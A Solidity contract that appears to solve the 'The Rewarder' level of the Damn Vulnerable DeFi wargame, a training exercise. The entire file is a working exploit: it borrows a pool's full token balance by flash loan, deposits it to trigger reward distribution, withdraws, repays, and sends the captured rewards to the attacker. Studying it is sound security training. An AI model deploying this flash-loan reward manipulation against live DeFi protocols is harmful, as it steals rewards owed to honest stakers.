// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// pools
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

// no need to import following tokens as they are already
// coming from above two files
// import "../DamnValuableToken.sol";  // coming from FlashLoanerPool
// import "../the-rewarder/AccountingToken.sol"; // coming from TheRewarderPool
// import "../the-rewarder/RewardToken.sol";// coming from TheRewarderPool

contract SolveTheRewarder {
    // pools
    FlashLoanerPool public immutable flashPool;
    TheRewarderPool public immutable rewardPool;
    // tokens
    DamnValuableToken public immutable dvt;
    RewardToken public immutable rewardToken;

    constructor(
        FlashLoanerPool _flashPool,
        TheRewarderPool _rewardPool,
        DamnValuableToken _dvt,
        RewardToken _rewardToken
    ) {
        flashPool = _flashPool;
        rewardPool = _rewardPool;
        dvt = _dvt;
        rewardToken = _rewardToken;
    }

    function solve() external {
        // to get the most rewards, get a flash loan of all
        // the DVTs from the flash loan pool
        flashPool.flashLoan(dvt.balanceOf(address(flashPool)));

        // after getting (and repaying the flash loan) this contract will have lots of
        // RewardToken(s). Send all of them to the attacker
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    // this function will be called automatically by the FlashLoanerPool contract
    function receiveFlashLoan(uint amount) external {
        // now this contract has lots of DVTs (1 million)
        // so, in order to get the RewardToken(s) from the RewardPool
        // send all of them to it

        dvt.approve(address(rewardPool), amount);
        // this will internally call the `distributeRewards`function inside the RewardPool
        // which will send lots of RewardTokens to this contract
        rewardPool.deposit(amount);
        // Get back the DVTs to repay the flash loan
        rewardPool.withdraw(amount);

        // repay
        dvt.transfer(address(flashPool), amount);
    }
}
